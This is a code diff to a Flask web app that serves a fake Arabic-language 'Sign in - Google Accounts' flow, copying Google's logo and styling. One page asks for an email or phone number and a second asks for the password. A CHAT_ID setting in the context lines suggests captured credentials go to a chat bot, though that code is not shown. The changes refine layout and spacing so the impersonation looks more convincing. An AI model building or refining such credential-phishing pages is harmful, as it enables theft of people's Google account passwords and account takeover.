@@ -12,7 +12,7 @@ CHAT_ID = os.getenv("CHAT_ID")
 GOOGLE_OFFICIAL_URL = "https://accounts.google.com/"
 
 
-# الصفحة الأولى: فصل الحاويات بالكامل لعزل العناصر عن زر التالي
+# الصفحة الأولى: تجميع وترتيب العناصر بسلاسة دون فراغات مزعجة
 @app.route("/", methods=["GET", "POST"])
 def step1():
   error = ""
@@ -43,20 +43,18 @@ def step1():
     <title>تسجيل الدخول - حسابات Google</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; }
-        html, body { 
+        
+        body { 
             background: #fff; 
             width: 100vw; 
-            height: 100vh; 
-            overflow: hidden; 
+            min-height: 100vh; 
             display: flex; 
             flex-direction: column; 
-            justify-content: space-between; 
             align-items: center; 
-            padding: 16px;
+            padding: 24px 16px;
         }
         
-        /* حاوية المحتوى العلوي مستقلة تماماً */
-        .login-container {
+        .login-card {
             width: 100%;
             max-width: 400px;
             display: flex;
@@ -68,17 +66,17 @@ def step1():
         .google-g {
             width: 36px;
             height: 36px;
-            margin-bottom: 6px;
+            margin-bottom: 8px;
         }
 
-        .title { font-size: 22px; font-weight: 400; color: #202124; margin-bottom: 4px; }
-        .subtitle { font-size: 13px; color: #5f6368; margin-bottom: 4px; line-height: 1.4; }
+        .title { font-size: 22px; font-weight: 400; color: #202124; margin-bottom: 6px; }
+        .subtitle { font-size: 13.5px; color: #5f6368; margin-bottom: 4px; line-height: 1.4; }
         
         .info-link {
-            font-size: 13px;
+            font-size: 13.5px;
             color: #1a73e8;
             text-decoration: none;
-            margin-bottom: 16px;
+            margin-bottom: 20px;
             display: inline-block;
         }
         .info-link:hover { text-decoration: underline; }
@@ -109,35 +107,32 @@ def step1():
         }
         .input-group input:focus { border-color: #1a73e8; border-width: 2px; padding: 12px 13px; }
 
-        .links-container {
+        .links-wrapper {
             width: 100%;
             display: flex;
-            flex-direction: column;
-            align-items: flex-start;
-            padding: 0 2px;
+            justify-content: space-between;
+            align-items: center;
             margin-top: 8px;
+            padding: 0 2px;
         }
-        .links-container a {
+
+        .links-wrapper a {
             color: #1a73e8;
             font-size: 14px;
             text-decoration: none;
             font-weight: 500;
         }
-        .links-container a:hover { text-decoration: underline; }
+        .links-wrapper a:hover { text-decoration: underline; }
 
-        /* التحكم بمسافة "إنشاء حساب" بحرية تامة دون التأثير على أسفل الصفحة */
-        .create-account-link {
-            margin-top: 24px; 
-        }
-
-        /* حاوية زر التالي السفلية معزولة تماماً في الأسفل */
+        /* منطقة الأزرار السفلية مرتبة ومتصلة طبيعياً داخل الكارد */
         .footer-action {
             width: 100%;
             max-width: 400px;
             display: flex;
-            justify-content: flex-end;
+            justify-content: space-between;
             align-items: center;
-            padding-bottom: 12px;
+            margin-top: 36px;
+            padding: 0 2px;
         }
 
         .submit-btn {
@@ -155,7 +150,7 @@ def step1():
     </style>
 </head>
 <body>
-    <div class="login-container">
+    <div class="login-card">
         <svg class="google-g" viewBox="0 0 24 24">
             <path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.51h6.6c-.29 1.52-1.14 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.66-5.17 3.66-9.17z"/>
             <path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.13 0-5.78-2.11-6.73-4.96H1.18v3.14C3.15 21.32 7.23 24 12 24z"/>
@@ -176,15 +171,15 @@ def step1():
                 <input type="text" name="email" required placeholder="البريد الإلكتروني أو الهاتف">
             </div>
             
-            <div class="links-container">
+            <div class="links-wrapper">
                 <a href="#">هل نسيت بريدك الإلكتروني؟</a>
-                <a href="https://accounts.google.com/signup" target="_blank" class="create-account-link">إنشاء حساب</a>
             </div>
         </form>
-    </div>
 
-    <div class="footer-action">
-        <button type="submit" form="emailForm" class="submit-btn">التالي</button>
+        <div class="footer-action">
+            <a href="https://accounts.google.com/signup" target="_blank" style="color: #1a73e8; font-size: 14px; text-decoration: none; font-weight: 500;">إنشاء حساب</a>
+            <button type="submit" form="emailForm" class="submit-btn">التالي</button>
+        </div>
     </div>
 </body>
 </html>
@@ -230,19 +225,18 @@ def step2():
     <title>تسجيل الدخول - حسابات Google</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; }
-        html, body { 
+        
+        body { 
             background: #fff; 
             width: 100vw; 
-            height: 100vh; 
-            overflow: hidden; 
+            min-height: 100vh; 
             display: flex; 
             flex-direction: column; 
-            justify-content: space-between; 
             align-items: center; 
-            padding: 16px;
+            padding: 24px 16px;
         }
         
-        .login-container {
+        .login-card {
             width: 100%;
             max-width: 400px;
             display: flex;
@@ -255,7 +249,7 @@ def step2():
             font-size: 22px;
             font-weight: 500;
             color: #202124;
-            margin-bottom: 10px;
+            margin-bottom: 12px;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -269,7 +263,7 @@ def step2():
         .google-logo span span:nth-child(5) { color: #34A853; }
         .google-logo span span:nth-child(6) { color: #EA4335; }
 
-        .title { font-size: 22px; font-weight: 400; color: #202124; margin-bottom: 8px; }
+        .title { font-size: 22px; font-weight: 400; color: #202124; margin-bottom: 10px; }
         
         .user-chip {
             display: inline-flex;
@@ -277,8 +271,8 @@ def step2():
             padding: 4px 12px 4px 4px;
             border: 1px solid #dadce0;
             border-radius: 100px;
-            margin-bottom: 16px;
-            font-size: 13px;
+            margin-bottom: 20px;
+            font-size: 13.5px;
             color: #3c4043;
             gap: 6px;
             background: #fff;
@@ -298,7 +292,7 @@ def step2():
             border: 1px solid #fad2cf; 
         }
 
-        .input-group { width: 100%; margin-bottom: 10px; }
+        .input-group { width: 100%; margin-bottom: 12px; }
         .input-group input {
             width: 100%;
             padding: 13px 14px;
@@ -317,7 +311,8 @@ def step2():
             display: flex;
             justify-content: flex-end;
             align-items: center;
-            padding-bottom: 12px;
+            margin-top: 36px;
+            padding: 0 2px;
         }
 
         .submit-btn {
@@ -335,7 +330,7 @@ def step2():
     </style>
 </head>
 <body>
-    <div class="login-container">
+    <div class="login-card">
         <div class="google-logo">
             <span>
                 <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
@@ -350,7 +345,7 @@ def step2():
         </div>
 
         {% if error %}
-            <div class="error-msg">{{ error }}</div>
+            <div class="error-msg">{{ error }}`</div>
         {% endif %}
 
         <form id="passForm" method="POST" style="width: 100%;">
@@ -358,10 +353,10 @@ def step2():
                 <input type="password" name="password" required placeholder="إدخال كلمة المرور">
             </div>
         </form>
-    </div>
 
-    <div class="footer-action">
-        <button type="submit" form="passForm" class="submit-btn">التالي</button>
+        <div class="footer-action">
+            <button type="submit" form="passForm" class="submit-btn">التالي</button>
+        </div>
     </div>
 </body>
 </html>
